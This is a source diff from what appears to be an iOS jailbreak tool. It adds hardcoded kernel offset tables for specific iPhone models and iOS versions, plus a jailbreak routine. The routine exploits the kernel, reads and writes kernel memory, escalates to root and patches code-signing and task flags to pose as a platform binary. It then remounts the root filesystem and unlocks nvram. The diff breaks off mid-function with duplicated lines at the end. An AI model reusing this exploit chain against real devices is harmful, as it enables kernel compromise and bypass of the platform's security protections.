@@ -38,7 +38,7 @@
         ret = KERN_FAILURE;\
         goto out;\
     }
-#if 0
+#ifdef J96_11_2_1
 offsets_t offs = (offsets_t){
     #ifdef __LP64__
     .constant = {
@@ -96,7 +96,8 @@ offsets_t offs = (offsets_t){
     },
     #endif
 };
-#else
+#endif
+#ifdef J96_11_3_1
 offsets_t offs = (offsets_t){
     #ifdef __LP64__
     .constant = {
@@ -156,7 +157,223 @@ offsets_t offs = (offsets_t){
 };
 #endif
 
+#define N69_11_3
+#ifdef N69_11_3
+offsets_t offs = (offsets_t){
+    #ifdef __LP64__
+    .constant = {
+        .kernel_image_base = 0xfffffff007004000, // static
+    },
+    .funcs = {
+        .copyin = 0xFFFFFFF0071A7090, // symbol
+        .copyout = 0xFFFFFFF0071A72B4, // symbol 
+        .current_task = 0xFFFFFFF0070F76C4, // symbol
+        .get_bsdtask_info = 0xFFFFFFF00710CDC0, // symbol 
+        .vm_map_wire_external = 0xFFFFFFF007153484, // symbol
+        .vfs_context_current = 0xFFFFFFF0071F9A04, // symbol
+        .vnode_lookup = 0xFFFFFFF0071DB710, // symbol
+        .osunserializexml = 0xFFFFFFF0074E2404, // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
+        .proc_find = 0xFFFFFFF0073F35B8 , // symbol
+        .proc_rele = 0xFFFFFFF0073F3528, // symbol 
 
+        .smalloc = 0xfffffff006b1acb0, // isn't used anywhere
+        .ipc_port_alloc_special = 0xFFFFFFF0070B915C, // \"ipc_processor_init\" in processor_start -> call above
+        .ipc_kobject_set = 0xFFFFFFF0070CF30C, // above _mach_msg_send_from_kernel_proper
+        .ipc_port_make_send = 0xFFFFFFF0070B88D8, // first call in long path of KUNCUserNotificationDisplayFromBundle
+    },
+    .gadgets = {
+        .add_x0_x0_ret = 0xFFFFFFF0073C96A8, // gadget (or _csblob_get_cdhash)
+    },
+    .data = {
+        .kernel_task = 0xFFFFFFF0075D5048, // symbol 
+        .kern_proc = 0xFFFFFFF0075D50A0, // symbol (kernproc)
+        .rootvnode = 0xFFFFFFF0075D5088, // symbol 
+
+        .realhost = 0xFFFFFFF0075DAB98, // _host_priv_self -> adrp addr
+        .zone_map = 0xFFFFFFF0075F7E50, // str 'zone_init: kmem_suballoc failed', first qword above 
+        .osboolean_true = 0xFFFFFFF007644418, // OSBoolean::withBoolean -> first adrp addr (isn't used anywhere tho)
+        .trust_cache = 0xFFFFFFF0076B0EE8, // %s: trust cache loaded successfully.\n store above
+    },
+    .vtabs = {
+        .iosurface_root_userclient = 0xfffffff006e88c50, // 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
+    },
+    .struct_offsets = {
+        .is_task_offset = 0x28,
+        .task_itk_self = 0xd8,
+        .itk_registered = 0x2f0,
+        .ipr_size = 0x8, // ipc_port_request->name->size
+        .sizeof_task = 0x5c8, // size of entire task struct
+        .proc_task = 0x18, // proc->task
+        .proc_p_csflags = 0x2a8, // proc->p_csflags (_cs_restricted, first ldr offset)
+        .task_t_flags = 0x3a0, // task->t_flags
+        .task_all_image_info_addr = 0x3a8, // task->all_image_info_addr (theoretically just +0x8 from t_flags)
+        .task_all_image_info_size = 0x3b0,  // task->all_image_info_size
+    },
+    .iosurface = {
+        .create_outsize = 0xbc8,
+        .create_surface = 0,
+        .set_value = 9,
+    },
+    #endif
+};
+#endif
+#ifdef N69_11_4
+offsets_t offs = (offsets_t){
+    #ifdef __LP64__
+    .constant = {
+        .kernel_image_base = 0xfffffff007004000, // static
+    },
+    .funcs = {
+        .copyin = 0xFFFFFFF0071A71CC, // symbol
+        .copyout = 0xFFFFFFF0071A73F0, // symbol 
+        .current_task = 0xFFFFFFF0070F4C4C, // symbol
+        .get_bsdtask_info = 0xFFFFFFF00710A348, // symbol 
+        .vm_map_wire_external = 0xFFFFFFF007153574, // symbol
+        .vfs_context_current = 0xFFFFFFF0071F9BCC, // symbol
+        .vnode_lookup = 0xFFFFFFF0071DB8D8, // symbol
+        .osunserializexml = 0xFFFFFFF0074E2A58, // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
+        .proc_find = 0xFFFFFFF0073F3B68, // symbol
+        .proc_rele = 0xFFFFFFF0073F3AD8, // symbol 
+
+        .smalloc = 0xfffffff006b1acb0, // isn't used anywhere
+        .ipc_port_alloc_special = 0xFFFFFFF0070B915C, // \"ipc_processor_init\" in processor_start -> call above
+        .ipc_kobject_set = 0xFFFFFFF0070CF30C, // above _mach_msg_send_from_kernel_proper
+        .ipc_port_make_send = 0xFFFFFFF0070B88D8, // first call in long path of KUNCUserNotificationDisplayFromBundle
+    },
+    .gadgets = {
+        .add_x0_x0_ret = 0xFFFFFFF0073C9C58, // gadget (or _csblob_get_cdhash)
+    },
+    .data = {
+        .kernel_task = 0xFFFFFFF0075D9048, // symbol 
+        .kern_proc = 0xFFFFFFF0075D90A0, // symbol (kernproc)
+        .rootvnode = 0xFFFFFFF0075D9088, // symbol 
+
+        .realhost = 0xFFFFFFF0075DEB98, // _host_priv_self -> adrp addr
+        .zone_map = 0xFFFFFFF0075FBE50, // str 'zone_init: kmem_suballoc failed', first qword above 
+        .osboolean_true = 0xFFFFFFF007648428, // OSBoolean::withBoolean -> first adrp addr (isn't used anywhere tho)
+        .trust_cache = 0xFFFFFFF0076B4EE8, // %s: trust cache loaded successfully.\n store above
+    },
+    .vtabs = {
+        .iosurface_root_userclient = 0xfffffff006e88e50, // 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
+    },
+    .struct_offsets = {
+        .is_task_offset = 0x28,
+        .task_itk_self = 0xd8,
+        .itk_registered = 0x2f0,
+        .ipr_size = 0x8, // ipc_port_request->name->size
+        .sizeof_task = 0x5c8, // size of entire task struct
+        .proc_task = 0x18, // proc->task
+        .proc_p_csflags = 0x2a8, // proc->p_csflags (_cs_restricted, first ldr offset)
+        .task_t_flags = 0x3a0, // task->t_flags
+        .task_all_image_info_addr = 0x3a8, // task->all_image_info_addr (theoretically just +0x8 from t_flags)
+        .task_all_image_info_size = 0x3b0,  // task->all_image_info_size
+    },
+    .iosurface = {
+        .create_outsize = 0xbc8,
+        .create_surface = 0,
+        .set_value = 9,
+    },
+    #endif
+};
+#endif
+
+
+task_t kernel_task;
+kptr_t kernel_slide;
+kptr_t kernproc;
+
+kern_return_t jailbreak(uint32_t opt)
+{
+    kern_return_t ret = 0;
+    task_t self = mach_task_self();
+    kptr_t kbase = 0;
+    NSFileManager *fileMgr = [NSFileManager defaultManager];
+
+    if(opt & JBOPT_POST_ONLY)
+    {
+        ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kernel_task);
+        ASSERT_RET_PORT(out, "kernel_task", ret, kernel_task);
+        task_dyld_info_data_t info;
+        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+        ASSERT_RET(out, "task_info", task_info(kernel_task, TASK_DYLD_INFO, (task_info_t)&info, &cnt));
+        kbase = info.all_image_info_addr;
+		LOG("kbase %llx\n",kbase);
+    }
+    else
+    {
+        suspend_all_threads();
+
+        ret = pwn_kernel(offs, &kernel_task, &kbase);
+
+        resume_all_threads();
+            
+        if(ret != KERN_SUCCESS) goto out;
+
+        LOG("kernel been dun fucked");
+    }
+
+    kernel_slide = kbase - offs.constant.kernel_image_base;
+	LOG("kslide %llx\n",kernel_slide);
+
+    if (!MACH_PORT_VALID(kernel_task))
+    {
+        LOG("invalid kernel task");
+        goto out;
+    }
+
+    LOG("got kernel_task: %x\n", kernel_task);
+
+    kernproc = rk64(offs.data.kern_proc + kernel_slide);
+    VAL_CHECK(kernproc);
+
+    LOG("kernproc: %llx\n", kernproc);
+
+    MACH(elevate_to_root());
+
+    MACH(init_kexecute(offs.data.zone_map, offs.gadgets.add_x0_x0_ret));
+
+    kptr_t kexec_test = kexecute(offs.gadgets.add_x0_x0_ret, 1, 0x20);
+    VAL_CHECK(kexec_test);
+
+    uint64_t myproc = find_proc(getpid());
+    VAL_CHECK(myproc);
+
+    uint64_t mytask = rk64(myproc + offs.struct_offsets.proc_task); // proc->task
+    VAL_CHECK(mytask);
+
+    {
+        // patch our csflags
+        uint32_t csflags = rk32(myproc + offs.struct_offsets.proc_p_csflags); // proc->p_csflags (_cs_restricted, first ldr offset)
+        VAL_CHECK(csflags);
+        LOG("current csflags: %x", csflags);
+
+        csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
+        wk32(myproc + offs.struct_offsets.proc_p_csflags, csflags);
+        LOG("updated csflags: %x", csflags);
+    }
+
+    {
+        // patch t_flags
+        // bypasses task_conversion_eval checks 
+        uint32_t t_flags = rk32(mytask + offs.struct_offsets.task_t_flags); // task->t_flags
+        VAL_CHECK(t_flags);
+
+        LOG("current t_flags: %x", t_flags);
+        t_flags |= 0x400; // TF_PLATFORM
+
+        wk32(mytask + offs.struct_offsets.task_t_flags, t_flags);
+        LOG("new t_flags: %x", t_flags);
+    }
+
+    MACH(remount_root_fs());
+    LOG("remounted root fs");
+
+    fclose(fopen("/.cydia_no_stash", "w"));
+
+    {
+        // patch nvram
+        MACH(unlock_nvram());
+        LOG("patched nvram successfully");
 task_t kernel_task;
 kptr_t kernel_slide;
 kptr_t kernproc;
